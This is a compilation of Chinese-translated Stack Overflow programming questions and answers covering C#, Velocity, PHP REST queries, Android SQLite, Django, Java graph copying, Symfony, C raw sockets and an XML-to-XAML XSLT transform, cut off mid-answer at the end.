        public static TSource MinBy<TSource, TKey>(this IEnumerable<TSource> source, Func<TSource, TKey> selector, IComparer<TKey> comparer)
        {
            using (IEnumerator<TSource> sourceIterator = source.GetEnumerator())
            {
                if (!sourceIterator.MoveNext())
                {
                    throw new InvalidOperationException("Sequence was empty");
                }

                TSource min = sourceIterator.Current;
                TKey minKey = selector(min);

                while (sourceIterator.MoveNext())
                {
                    TSource candidate = sourceIterator.Current;
                    TKey candidateProjected = selector(candidate);

                    if (comparer.Compare(candidateProjected, minKey) < 0)
                    {
                        min    = candidate;
                        minKey = candidateProjected;
                    }
                }

                return min;
            }
        }

        public static TSource MinBy<TSource, TKey>(this IEnumerable<TSource> source, Func<TSource, TKey> selector)
        {
            return source.MinBy(selector, Comparer<TKey>.Default);
        }
    }

    public static class Program
    {
        static void Main(string[] args)
        {
            List<Point> points = new List<Point>
            {
                new Point(7, 43),
                new Point(7, 42),
                new Point(6, 42),
                new Point(5, 42),
                new Point(6, 43),
                new Point(5, 43)
            };

            var result = points.MinBy( p => p.X*p.X + p.Y*p.Y );

            Console.WriteLine(result);
        }
    }
} 
```

# java - 如何选择 vm 文件中 $date 的格式？

> ID：15092372
> 
> 赞同：16
> 
> 时间：2013-02-26T15:03:13.590
> 
> 标签：java, velocity

我有一个 $date 定义为“星期几，月日，年”例如：2013 年 2 月 26 日，星期二

我不知道 $date 是在哪里定义的，但我喜欢将小时添加到这个 $date 变量中，或者用小时创建一个变量，你知道我怎样才能把它放在 .vm 文件中吗？

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-02-26T15:39:34.767

[Velocity 提供了一个 DateTool 类](http://velocity.apache.org/tools/devel/javadoc/org/apache/velocity/tools/generic/DateTool.html)来格式化日期。您需要将此类的一个实例放入您的速度上下文中：

```
context.add("date", new DateTool()); 
```

然后你可以使用格式化命令，如：

```
$date.format('EEE, MMM d, yyyy at ha', $myDate) 
```

得到类似的东西`Tuesday, February 26, 2013 at 11AM`

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2015-06-25T18:04:43.533

不需要额外依赖或代码修改的替代解决方案：

```
#set( $String = '' )##
$String.format('%1$tY%1$tm%1$td%1$tH%1$tM%1$tS', $date) 
```

结合[其他](https://stackoverflow.com/a/31057149/603516)[两个](https://stackoverflow.com/a/15126547/603516) 答案。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2015-09-14T14:28:10.077

从文档中：

```
Symbol   Meaning                 Presentation        Example
   ------   -------                 ------------        -------
   G        era designator          (Text)              AD
   y        year                    (Number)            1996
   M        month in year           (Text & Number)     July & 07
   d        day in month            (Number)            10
   h        hour in am/pm (1~12)    (Number)            12
   H        hour in day (0~23)      (Number)            0
   m        minute in hour          (Number)            30
   s        second in minute        (Number)            55
   S        millisecond             (Number)            978
   E        day in week             (Text)              Tuesday
   D        day in year             (Number)            189
   F        day of week in month    (Number)            2 (2nd Wed in July)
   w        week in year            (Number)            27
   W        week in month           (Number)            2
   a        am/pm marker            (Text)              PM
   k        hour in day (1~24)      (Number)            24
   K        hour in am/pm (0~11)    (Number)            0
   z        time zone               (Text)              Pacific Standard Time
   '        escape for text         (Delimiter)
   ''       single quote            (Literal)           '

   Examples: "E, MMMM d" will result in "Tue, July 24"
             "EEE, M-d (H:m)" will result in "Tuesday, 7-24 (14:12)" 
```

希望有帮助

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-02-26T15:41:08.110

支持 Java 类之一必须将其放入[Context](http://velocity.apache.org/engine/devel/developer-guide.html#The_Context)中。如果您想以不同的方式格式化日期，您可以在该课程中进行。

另一种选择是将原始 Date 对象放入上下文中，然后调用 Velocity 模板中的方法对其进行格式化。如果需要，您也可以将 Apache Commons DateUtils 或其他帮助程序类传递给模板（请参阅[此答案](https://stackoverflow.com/a/13160350/612265)）。

# php - 构建REST api时如何处理查询字符串中的动态参数数量？

> ID：15092373
> 
> 赞同：2
> 
> 时间：2013-02-26T15:03:16.490
> 
> 标签：php, sql, api, rest

在构建处理资源的 RESTful api 时，可以通过一组动态参数进行查询，构建对数据库的查询的最佳方法是什么？

假设资源是一本书，可能的参数是：

```
author, year, publisher, pages, rating 
```

您可以使用任意数量的参数和任意组合构建查询，例如：

```
/books?rating=2 
```

或者

```
/books?author=james&year=2001&rating=4 
```

或者

```
/books?year=2010&publisher=greatbooks&pages=100&rating=5 
```

将这组动态参数转换为数据库查询的好方法是什么？

创建很多 if else 语句，例如：

```
if( isset($_GET['rating'] && isset($_GET['author']) ) {

    //Do query based on these parameters here...

} 
```

或者

```
if( isset($_GET['author'] && isset($_GET['year']) && isset($_GET['publisher']) ) {

    //Do query based on these parameters here...

} 
```

等等等等等等

或者设置所有变量，然后在查询中使用 LIKE 而不是 '='，如下所示：

```
if(!empty($_GET['author'])) {
    $author = $_GET['author'];
} else {
    $author = '%';
} 
```

进而

```
SELECT * FROM books WHERE author LIKE $author ... and so on 
```

还是有其他处理方法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T15:42:51.973

您应该尝试动态构建单个查询，而不是为每个可能的过滤器组合编写单独的查询。如果查询字符串上没有请求某些内容，那么您不必担心。

例如（请注意，我自己没有运行它，但它至少应该给你一个想法）：

```
$sql = 'SELECT * FROM books';

// build an array of WHERE clauses depending on what is in the query string
$clauses = array();
$filters = array('author', 'year', 'publisher', 'pages', 'rating');
foreach ($filters as $filter) {
  if (array_key_exists($filter, $_GET) {
    $clauses[] = sprintf("%s = '%s'", $filter, mysqli_real_escape_string($_GET[$filter]);
  }
}

// if there are clauses, add them to the query
if (!empty($clauses)) {
  $sql .= sprintf(' WHERE %s', implode(' AND ', $clauses));
}

// Run the query.... 
```

# php - PHP 代码丢失，因为文件编码

> ID：15092375
> 
> 赞同：3
> 
> 时间：2013-02-26T15:03:24.420
> 
> 标签：php, encoding, utf-8, binaryfiles

我在 PHP 类上工作了一段时间，但似乎我丢失了所有代码！文件大小是正确的（大约 25kb），但我剩下的只是，取决于我打开哪个源，使用哪个编辑器，一整页空格或一大行黑色菱形问号，我想知道是否有人有如何检索内容的线索，以及是否仍然可能。

最初该文件是 UTF8 编码的，但现在它被视为二进制文件（这是 SVN 在我尝试 diff 时告诉我的）。最糟糕的是，我已将此文件放在存储库中（Git 和 SVN ！！），但那里的副本也是二进制的，无论我选择什么版本。就像我以前从未打开过这个文件一样。

我尝试在 Notepad++ 中更改编码，但到目前为止我的代码仍然不可见。任何想法？

Git 文件是[https://github.com/nabab/bbn/blob/master/src/bbn/db/languages/sqlite.php](https://github.com/nabab/bbn/blob/master/src/bbn/db/languages/sqlite.php)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T11:06:38.320

不幸的是，就像提到的其他海报一样，我认为您可能丢失了代码。

为了将来帮助自己，尽管您应该尝试获得具有本地历史记录的 IDE，eclipse，sublime（在插件的帮助下）和电子文本编辑器是其中的一些。如果您将它与源代码控制结合使用，您应该希望能够避免在签入之间丢失工作。

# android - 部分代码在数据库中重置后将无法检索数据

> ID：15092378
> 
> 赞同：0
> 
> 时间：2013-02-26T15:03:29.073
> 
> 标签：android, database, sqlite, restart

按下restartButton后，我正在尝试将我的数据库重置为默认状态。我的问题是按下restartButton 后似乎无法检索新添加的数据。我在这里做错了什么？

重启按钮代码：

```
private void easySQLRestart() {
        sql = new SQLDatabaseLevelOne(MainActivity.this);
        sql.open();
        sql.restart();
        sql.close();
    } 
```

重启代码：

```
public void restart() {
        sqlDatabase = dbHelper.getWritableDatabase();
        sqlDatabase.delete(DATABASE_TABLE, null, null);
    } 
```

这是我在重置后添加新数据的部分：

```
public void updateScore(int score) {
                String strScore;

                if (score == 0) {
                    score = 1;
                } else if (score > 0) {
                    strScore = getScore();

                    if (strScore.equals("")) {
                        score = 1;
                    } else {
                        strScore = getScore();
                        int value = Integer.parseInt(strScore);
                        score += value;
                    }
                }

                ContentValues dbContentValues = new ContentValues();
                dbContentValues.put(KEY_SCORE, score);
                sqlDatabase.update(DATABASE_TABLE, dbContentValues, KEY_ID + "=" + 1,
                        null);
            } 
```

这是检索数据的代码：

```
 public String getScore() {
        String[] data = new String[] { KEY_ID, KEY_SCORE };
        Cursor dbCursor = sqlDatabase.query(DATABASE_TABLE, data, null, null,
                null, null, null);
        String dbResult = "";

        int dbQuestionStatus = dbCursor.getColumnIndex(KEY_SCORE);

        for (dbCursor.moveToFirst(); !dbCursor.isAfterLast(); dbCursor
                .moveToNext()) {
            dbResult += dbCursor.getString(dbQuestionStatus);
        }

        return dbResult;
    } 
```

这就是我添加数据的方式。它不会抛出异常：

```
sql = new SQLDatabaseLevelOne(
                                                EasyRoundActivity.this);
sql.open();
try {
                                            sql.updateScore(0);
                                            }catch(Exception e) {
                                                Context context = getApplicationContext();
                                                int duration = Toast.LENGTH_SHORT;
                                                Toast.makeText(context, "ERROR", duration).show();
                                        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T16:02:03.043

`SQLiteDatabase.update()`更新现有记录。要插入一些新的，您需要调用`SQLiteDatabase.inset()`

# html - 重新缩放和调整网页中嵌入的 wmv 文件的大小

> ID：15092382
> 
> 赞同：1
> 
> 时间：2013-02-26T15:03:33.713
> 
> 标签：html, embedding, wmv

我在我的网页中嵌入了一个 wmv 文件

但问题是我无法将视频帧重新缩放为对象大小和 div

这是我的代码

```
<div style="width: 300px; height: 220px;">
               <object width="300" height="220" classid="CLSID:22D6F312-B0F6-11D0-94AB-0080C74C7E95" standby="Loading Microsoft® Windows® Media Player components..." type="application/x-oleobject" codebase="http://activex.microsoft.com/activex/controls/mplayer/en/nsm p2inf.cab#Version=6,4,7,1112"> 
<param name="fileName" value="<?php echo base_url().$row['video_image'];?>"> 
<param name="autoStart" value="false"> 
<param name="showControls" value="true"> 
<param name="AllowChangeDisplaySize" value="true"> 
<param name="AutoSize" value="true">
<param name="ClickToPlay" value="true"> 
<embed type="application/x-mplayer2" 
       WIDTH="300" HEIGHT="220" pluginspage="http://www.microsoft.com/Windows/MediaPlayer/" src="<?php echo base_url().$row['video_image'];?>" autoStart="false" ></embed>
</object>
               </div> 
```

我上面脚本的问题是，如果视频帧大小为 700x500，那么它不会自动调整为对象大小或 div 大小，如 width=300px 和 height=220px

因此，视频的某些部分无法在框架中看到...我搜索了合适的答案，但找不到任何...

```
EDIT 
```

当我得到提示时，我使用了以下脚本

```
<object classid="CLSID:6BF52A52-394A-11d3-B153-00C04F79FAA6"
type="application/x-oleobject" style="width: 300px; height: 200px;">
<param name="URL" value="<?php echo base_url().$row['video_image'];?>" />
<param name="stretchToFit" value="1" />
<param name="showControls" value="1" />
<param name="showStatusBar" value="0" />
<param name="animationAtStart" value="1" />
<param name="autoStart" value="1" />
<param name="enableFullScreenControls" value="1"
/><embed src="<?php echo base_url().$row['video_image'];?>" style="width: 300px; height: 200px;" autoStart="1" animationAtStart="1" enableFullScreenControls="1" stretchToFit="1" type="application/x-ms-wmp"/></embed></object> 
```

虽然我已经编辑了这个脚本，但仍然没有任何效果

我看到我可以拉伸视频帧大小，但是如果我想缩小视频帧，那不会发生..我的意思是如果我的视频大小是 300x200，那么如果我将视频大小设置为 400x300，大小正在拉伸。。

但是如果我想将大小设置为 100x80，则视频正在运行并且只显示视频的一部分，因此视频帧大小似乎没有缩小

问题是如果在上面的第二个代码中我删除以下行

```
<embed src="<?php echo base_url().$row['video_image'];?>" style="width: 300px; height: 200px;" autoStart="1" animationAtStart="1" enableFullScreenControls="1" stretchToFit="1" type="application/x-ms-wmp"/></embed> 
```

然后视频也在 google-chrome 中播放……但不在 firefiox 中

所以这意味着

```
<embed src="<?php echo base_url().$row['video_image'];?>" style="width: 300px; height: 200px;" autoStart="1" animationAtStart="1" enableFullScreenControls="1" stretchToFit="1" type="application/x-ms-wmp"/></embed> 
```

负责 Firefox 中的视频。现在正如我之前所说，我可以将视频帧拉伸到更大的尺寸，但不能将其缩小到更小的尺寸

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:19:54.997

您可以尝试添加“StretchToFit”参数（作为参数和嵌入元素的属性）并将其值设置为“true”。

注意：这不会保留视频的原始纵横比。

# eclipse - bash 脚本的 Aptana 语法着色

> ID：15092387
> 
> 赞同：2
> 
> 时间：2013-02-26T15:03:42.063
> 
> 标签：eclipse, bash, shell, plugins, aptana

我无法使用任何语法着色插件来与`.sh`Apatana 中的 bash 文件一起使用。我看过这个帖子：

[https://stackoverflow.com/questions/7167009/how-to-edit-bash-scripts-with-aptana](https://stackoverflow.com/questions/7167009/how-to-edit-bash-scripts-with-aptana)

但它只是谈到了 Shell Script，它似乎不是一个文本编辑器，而是一个集成终端。

我也尝试过[ShellEd](http://sourceforge.net/apps/trac/shelled/)，但 Aptana 不符合安装要求（需要 Eclipse Juno 版本 4.2.x，而 Aptana 基于 3.7）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-09-15T14:45:01.247

**ShellEd 已准备就绪**

***安装***

现在可以在 Aptana Studio 3 中安装带有所有依赖项的 Shelled。

1.  [下载动态语言工具包 V4。](http://www.eclipse.org/downloads/download.php?file=/technology/dltk/downloads/drops/R4.0/R-4.0-201206120903/dltk-sdk-R-4.0-201206120903.zip)

2.  将存档添加到您的 repo lis。

3.  也将[Sourcforge 上的 Shelleds 存储库](http://sourceforge.net/projects/shelled/files/shelled/update/)添加到您的存储库列表中。

4.  安装 ShellEd。

5.  重新启动 Aptana Studio 3。

***定制***

打开

首选项 -Shell 脚本 --> 语法着色

并将元素颜色调整为您选择的主题。

PS：不要忘记在文件关联对话框中添加 shellEd 作为 *.sh 文件的默认编辑器。

# django - （Django）如何检测请求的行为？用户点击链接或按钮？

> ID：15092388
> 
> 赞同：0
> 
> 时间：2013-02-26T15:03:43.153
> 
> 标签：django, hyperlink, request

用户搜索时，将存储关键词和点击来源。

我使用一个名为 keyfrom 的隐藏输入来获取点击的来源。

```
<input type="hidden" name="keyfrom" value="web.index"> 
```

网址可能是这样的：`/?q='***'&keyfrom=web.index`

在中间件.py 中：

```
if request.GET.get('keyfrom', '')
    create a query record 
```

我使用django-pagination，page2的url可能是这样的：`/?q='***'&keyfrom=web.index&page=2`

此链接还将导致 middleware.py 创建一条记录。

我不想重复存储 page2...n 的数据。

我只想在用户单击搜索按钮时存储数据。

如何检测这种行为？

任何帮助将不胜感激。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:06:55.953

`page`您可以在中间件中显式查找参数

```
if request.GET.get('keyfrom', '') and not request.GET.get('page'):
    create a query record 
```

# java - 复制初始图表

> ID：15092390
> 
> 赞同：0
> 
> 时间：2013-02-26T15:03:51.767
> 
> 标签：java, graph

我想将我的复制到另一个图表中，以便修改新图表不会影响初始图表。我知道我正在通过价值传递来做这件事，但是我能做些什么来避免这种情况呢？

```
public Graph copyGraph(Graph initialGraph) {
    Graph newGraph = new Graph();
    for(int i = 0; i < initialGraph.getVerticesSize(); i++) {
        Vertex v2 = initialGraph.getVertices().get(i);          
        newGraph.getVertices().set(i, v2);
    }
    return newGraph;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:08:39.150

您的代码看起来不错，除了：

```
Vertex v2 = initialGraph.getVertices().get(i);          
newGraph.getVertices().set(i, copyVertex(v2)); 
```

您还需要复制顶点，类似于您的图形副本。复制图形并使用相同的顶点不会生成真正的副本。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:05:34.330

只要正确实现 Graph 的复制构造函数，`initialGraph`就已经是您传递给该函数的参数的副本，因为您通过副本传递此参数。

我也无法想象这是如何工作的：

```
Graph newGraph = new Graph(); 
```

`new Graph()`返回**指向**图形的指针，而不是图形。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-26T15:12:45.547

在这种情况下，我会使用`clone()`方法，以便不引用相同的对象：

```
public Graph copyGraph(Graph initialGraph) {
     Graph newGraph = initialGraph.clone();
     for(int i = 0; i < initialGraph.getVerticesSize(); i++) {
          Vertex v2 = initialGraph.getVertices().get(i).clone();          
          newGraph.getVertices().set(i, v2);
     }
     return newGraph;
} 
```

如果`Vertex`包含对其他对象的引用，那么也需要克隆，这会导致`deep copying`.

**编辑**

你的类应该实现`Cloneable`和支持`clone()`方法。

```
public Object clone() {
    try {
        return super.clone();
    } catch (CloneNotSupportedException e) {
        return null;
    }
} 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2016-01-02T19:37:41.580

复制图表的一个非常粗略（但快速）的解决方案是：

```
 DirectedGraph<String, DefaultEdge> graph = new DefaultDirectedGraph<String, DefaultEdge>(DefaultEdge.class);
    DirectedGraph<String, DefaultEdge> revGraph = new EdgeReversedGraph<>(graph);
    DirectedGraph<String, DefaultEdge> graphCopy = new EdgeReversedGraph<>(revGraph);
    //To reduce the memory complexity
    revGraph = null; 
```

但是，请记住，如果图形太大，该解决方案将具有很高的内存和计算复杂性。丢弃中间反向图将改进解决方案。

# symfony - 选择生成整个目录结构时生成包时出现 IOException

> ID：15092391
> 
> 赞同：0
> 
> 时间：2013-02-26T15:03:55.333
> 
> 标签：symfony, xampp, bundle, generator

我在 Win7 xampp 安装上试用 Symfony2，并且遇到了 generate:bundle 问题。

```
php app/console generate:bundle --namespace=amd/HelloBundle --format=yml 
```

如果我在问题中选择 'yes' （默认为 'no' ）：

*是否要生成整个目录结构*

我收到以下消息：

```
[Symfony\Component\Filesystem\Exception\IOException]
Failed to touch H:/<pathToSymfony2Installation>/src//amd/HelloBundle/Resources/doc/index.rst 
```

...当然，其余的步骤不遵循。创建了正确的命名空间和捆绑目录，但永远无法达到诸如自动路由设置之类的东西。

在选择放置源的目录时，我选择默认的：

```
Target directory [H:/<pathToSymfony2Installation>/src]: 
```

（注意：没有斜线）

我注意到无论我做什么，在 IO 异常消息中都有一个额外的斜杠（在 'src' 之后），这会导致 IO 错误吗？

如果我输入一个斜杠，则会添加另一个斜杠（如您所料），如果我输入的内容与默认斜杠完全相同 - 特别是省略一个斜杠，我仍然会在“src”之后和我的命名空间和捆绑包之前得到两个斜杠名字。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-23T17:05:59.637

我遇到了和你一样的问题。终于查明原因：FAT32

当我将 XAMPP 放在 NTFS 格式的驱动器上时，我没有遇到任何问题。（驱动器 C 甚至任何便携式驱动器） 但是，当我将 XAMPP 放在 FAT32 格式的驱动器上时出现错误。（嗯……我猜有些 PHP 函数，比如 touch()，在 FAT32 系统上不能正常工作）

此外，当我运行此命令时，我还在 FAT32 驱动器上遇到其他问题（找不到实体）：

> Symfony> php 应用程序/控制台原则：生成：实体 xxxxxx

（注意：如果我禁用 auto_mapping 并在 config.yml 中明确设置“entity_managers：”，则可以修复它）但是，一旦我将 XAMPP 放回 NTFS 驱动器，auto_mapping 就可以完美地工作。

因此，您可以检查您的文件系统。如果您的 XAMPP 位于 FAT32 驱动器上，请将其移至 NTFS 驱动器，然后再试一次。

祝你好运。

# c - 带有原始套接字的recv

> ID：15092397
> 
> 赞同：1
> 
> 时间：2013-02-26T15:04:08.963
> 
> 标签：c, sockets, recv

我正在尝试从套接字接收原始数据包并失败。消息仅在服务器站点上发送数据包时打印。当没有数据包被传输时 - 程序在 recv 中挂起（同步模式下的套接字）。

问题是打印消息是“缓冲区”但没有收到数据。

```
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>

#define ETH_FRAME_LEN 1400

int main(){

    int s; /*socketdescriptor*/

    s = socket(PF_PACKET, SOCK_RAW, htons(0x88b5));
    if (s == -1) { perror("socket"); }

        struct sockaddr_ll socket_address;
    int r;
    char ifName[IFNAMSIZ] = "eth0";

    struct ifreq ifr;  
        strncpy((char *)ifr.ifr_name ,device , IFNAMSIZ); 

    /* Get the index of the interface to send on */
    memset(&if_idx, 0, sizeof(struct ifreq));
    strncpy(if_idx.ifr_name, ifName, IFNAMSIZ-1);
    if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0)
        perror("SIOCGIFINDEX");

    /* Get the MAC address of the interface to send on */   
    memset(&if_mac, 0, sizeof(struct ifreq));
    strncpy(if_mac.ifr_name, ifName, IFNAMSIZ-1);
    if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0)
        perror("SIOCGIFHWADDR");

        memset(&socket_address, 0, sizeof(socket_address));
        socket_address.sll_ifindex = ifr.if_idx;
        socket_address.sll_protocol = htons(0x88b5);
        socket_address.sll_family = PF_PACKET;
        socket_address.sll_pkttype = PACKET_OUTGOING;

        r = bind(s, (struct sockaddr*)&socket_address,
                    sizeof(socket_address));
    if ( r < 0) { perror("bind")};

    void* buffer = (void*)malloc(ETH_FRAME_LEN); /*Buffer for ethernet frame*/
    int length = 0; /*length of the received frame*/ 

    length = recv(s, buffer, ETH_FRAME_LEN, 0,);
    if (length == -1) { perror("recvfrom"); }
    printf ("buffer %s\n", buffer);

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T15:06:37.330

您只能`%s`对 C 样式字符串使用格式说明符。您不能将它用于任意二进制数据。它怎么知道要打印多少个字符？您在一个名为 的变量中有长度`length`。您需要打印那么多字符。例如：

```
for (int i = 0; i < length; ++i)
     putchar(((char *)buffer)[i]); 
```

这可能看起来像垃圾，因为您正在输出一堆不可打印的字符。也许你想要类似的东西：

```
void print(void *buf, int length)
{
      char *bp = (char *) buf;
      for (int i = 0; i < length; ++i)
          putchar( isprintf(bp[i]) ? bp[i] : '.' );
      putchar('\n');
} 
```

这将用点替换不可打印的字符。

# objective-c - 限制 touchesMoved 到某些对象

> ID：15092398
> 
> 赞同：0
> 
> 时间：2013-02-26T15:04:11.280
> 
> 标签：objective-c

我在 3x3 网格中布置了 8 个瓷砖，其中有一个空白点。但是，唯一可以移动的瓷砖是空白点旁边的瓷砖。

我有一个 centerCoordinate 方法，可以获取您触摸的任何瓷砖的中心坐标：

```
- (CGPoint) centerCoordinate: (NSSet*)touches withEvent:(UIEvent*) event {
UITouch* touch = [touches anyObject];
location = [touch locationInView:self];
centerCoord = [touch locationInView:self.superview];
centerCoord.x += self.frame.size.width/2-location.x;
centerCoord.y += self.frame.size.height/2-location.y;
self.center = centerCoord;

return centerCoord;
} 
```

在我的 touchesMoved 方法中，我认为添加一个简单的 if 检查可以确保沿某个 x 轴的任何图块都可以移动：

```
- (void)touchesMoved:(NSSet*)touches withEvent:(UIEvent*)event {
if ([self centerCoordinate:touches withEvent:event].x == 374) {
NSLog(@"got here");
UITouch* touch = [touches anyObject];
CGPoint tileLocation = [touch locationInView:self.superview];
tileLocation.x += self.frame.size.width/2-location.x;
tileLocation.y += self.frame.size.height/2-location.y;
self.center = tileLocation;
NSLog(@"got here2");
}
} 
```

当我尝试移动瓷砖时，“到了这里”和“到了这里2”都打印出来了，但瓷砖没有移动。如果我删除 if 语句，瓷砖可以自由移动。

编辑：当我改变触摸移动到这个时，我可以移动不在 x = 374 中的图块。如果我在图块处移动到 x = 374，它会在我放开它后锁定到位。

```
- (void)touchesMoved:(NSSet*)touches withEvent:(UIEvent*)event {

NSLog(@"---1---");
UITouch* touch = [touches anyObject];
CGPoint tileLocation = [touch locationInView:self.superview];
if ([self centerCoordinate:touches withEvent:event].x == 374) {
NSLog(@"---2---");
tileLocation.x += self.frame.size.width/2-location.x;
tileLocation.y += self.frame.size.height/2-location.y;
NSLog(@"---3---");
}
self.center = tileLocation;
NSLog(@"---4---");
} 
```

有什么想法会导致这种情况吗？

# c# - 使用 XSL 将 XML 转换为 XAML

> ID：15092403
> 
> 赞同：1
> 
> 时间：2013-02-26T15:04:28.750
> 
> 标签：c#, xml, xaml, xslt

假设我在 xml 中有以下代码片段：

```
<PanelWrapper   id="RootPanel" 
                dock="Fill" 
                width="1092" 
                height="605" 
                backcolor="Transparent" 
                visible="True">
    <ButtonWrapper  id="button1" 
                    dock="Left" 
                    text="TestButton" 
                    width="75" 
                    height="605" 
                    border-left="1" 
                    border-top="1" 
                    border-right="1" 
                    border-bottom="1" 
                    font-name="Tahoma" 
                    font-size="9" 
                    font-style="Regular">
    </ButtonWrapper>
</PanelWrapper> 
```

我需要将 xml 代码转换为 XAML。预期的最终结果应如下所示：

```
<WrapPanel Name="RootPanel" 
           DockPanel.Dock="Left, Right, Top, Bottom" 
           Width="1092" Height="605" 
           Background="Transparent"  
           Visibility="Visible">
    <Button Name="button1" 
            DockPanel.Dock ="Left" 
            Content="TestButton" 
            Width="75" 
            Height="605" 
            BorderThickness="1,1,1,1" 
            FontFamily="Tahoma" 
            FontSize="9" 
            FontStyle="Normal">
    </Button>
</WrapPanel> 
```

使用 xsl 样式表可以进行这种转换吗？

我特别问的是这样的转换：

从

```
border-left="1" 
border-top="1" 
border-right="1" 
border-bottom="1" 
```

到

```
BorderThickness="1,1,1,1" 
```

或从

```
visible="True" 
```

到

```
Visibility="Visible" 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-26T16:22:57.220

这种转变是可以做到的。我假设您使用的是 XSLT 1.0，XSLT 2.0 中的解决方案会更短（因为我必须使用递归模板来实现 2.）。我还假设：

1.  Visible 的可能值是：'True'、'False' 转换为 'Visible' 和 'Hidden'。
2.  BorderThickness 属性按以下顺序构建：左、上、右、下。此外，如果某些边框属性未找到，则其值默认为零。

代码的想法是手动匹配每个属性并将其值替换为正确的值。因为我不知道遵循所有属性的逻辑（除了我在 1\. 和 2\. 中假设的位），所以转换仅限于给定的 XML，但是我希望它能让您了解如何实现您的目标试图做。

```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
    <xsl:output method="xml" encoding="UTF-8" indent="yes"/>

    <!-- Ignore attributes by default, so we can have more control
         about unhandled attributes -->
    <xsl:template match="@*" />

    <!-- Transform PanelWrapper to WrapPannel -->
    <xsl:template match="PanelWrapper">
        <WrapPanel>
            <xsl:apply-templates select="@*|*" />
        </WrapPanel>
    </xsl:template>

    <!-- Transform ButtonWrapper to Button -->
    <xsl:template match="ButtonWrapper">
        <Button>
            <xsl:apply-templates select="@*" />
        </Button>
    </xsl:template>

    <!-- Map id attribute to Name -->
    <xsl:template match="@id">
        <xsl:attribute name="Name">
            <xsl:value-of select="." />
        </xsl:attribute>
    </xsl:template>

    <!-- Map @dock = 'Fill' to @dock = 'Left, Right...etc' -->
    <xsl:template match="@dock[. = 'Fill']">
        <xsl:attribute name="DockPanel.Dock">
            <xsl:value-of select="'Left, Right, Top, Bottom'" />
        </xsl:attribute>
    </xsl:template>

    <!-- For every other @dock value, map @dock to DockPanel.dock
         and copy value --> 
    <xsl:template match="@dock">
        <xsl:attribute name="DockPanel.Dock">
            <xsl:value-of select="." />
        </xsl:attribute>
    </xsl:template>

    <!-- Map width attribute to Width -->
    <xsl:template match="@width">
        <xsl:attribute name="Width">
            <xsl:value-of select="." />
        </xsl:attribute>
    </xsl:template>

    <!-- Map height attribute to Height -->
    <xsl:template match="@height">
        <xsl:attribute name="Height">
            <xsl:value-of select="." />
        </xsl:attribute>
    </xsl:template>

    <!-- Map backcolor to Background -->
    <xsl:template match="@backcolor">
        <xsl:attribute name="Background">
            <xsl:value-of select="." />
        </xsl:attribute>
    </xsl:template>

    <!-- Map visible attribute to Visibility -->
    <xsl:template match="@visible[. = 'True']">
        <xsl:attribute name="Visibility">visible</xsl:attribute>
    </xsl:template>

    <xsl:template match="@visible[. = 'False']">
        <xsl:attribute name="Visibility">hidden</xsl:attribute>
    </xsl:template>

    <!-- Map text attribute to content -->
    <xsl:template match="@text">
        <xsl:attribute name="Content">
            <xsl:value-of select="." />
        </xsl:attribute>
    </xsl:template>

    <!-- Build the border attribute -->
    <xsl:template match="@*[starts-with(local-name(), 'border-')][1]">
        <xsl:attribute name="BorderThickness">
            <!-- Print the border-elements in a comma separated list (non-defined attributes default
                 to zero) -->
            <xsl:call-template name="border-print" />
        </xsl:attribute>
    </xsl:template>

    <!-- Recursive template to group borders in BorderThickness -->
    <xsl:template name="border-print">
        <xsl:param name="string" select="'left  top   right bottom'" />
        <xsl:param name="parent" select=".." />
        <xsl:param name="not-first" select="false()" />

        <xsl:if test="$string != ''">
            <!-- Obtain next direction -->
            <xsl:variable name="direction" select="normalize-space(substring($string, 1, 6))" />
            <xsl:variable name="attr" select="$parent/@*[local-name() = concat('border-', $direction)]" />
            <!-- Print comma if not the first element -->
            <xsl:if test="$not-first"><xsl:text>,</xsl:text></xsl:if>
            <!-- Print zero if the attribute cannot be found -->
            <xsl:choose>
                <!-- Attribute found : print -->
                <xsl:when test="$attr">
                    <xsl:value-of select="$attr" />
                </xsl:when>
                <!-- Attribute not found: print 0 -->
                <xsl:otherwise>
                    <xsl:text>0</xsl:text>
                </xsl:otherwise>
            </xsl:choose>
            <!-- Recurse -->
            <xsl:call-template name="border-print">
                <xsl:with-param name="string" select="substring($string, 7)" />
                <xsl:with-param name="parent" select="$parent" />
                <xsl:with-param name="not-first" select="true()" />
            </xsl:call-template>
        </xsl:if>

    </xsl:template>

    <xsl:template match="@*" mode="print-border">
        <xsl:value-of select="concat(., ',')" />
    </xsl:template>

    <xsl:template match="@border-bottom" mode="print-border">
        <xsl:value-of select="." />
    </xsl:template>

    <!-- Map font properties -->
    <xsl:template match="@font-name">
        <xsl:attribute name="FontFamily">
            <xsl:value-of select="." />
        </xsl:attribute>
    </xsl:template>

    <xsl:template match="@font-size">
        <xsl:attribute name="FontSize">
            <xsl:value-of select="." />
        </xsl:attribute>
    </xsl:template>

    <xsl:template match="@font-style[. = 'Regular']">
        <xsl:attribute name="FontStyle">Normal</xsl:attribute>
    </xsl:template>

</xsl:stylesheet> 
```

代码的主要思想是：

*   您可以使用以下模板更改元素的名称：

    ```
    <!-- Transform PanelWrapper to WrapPannel -->
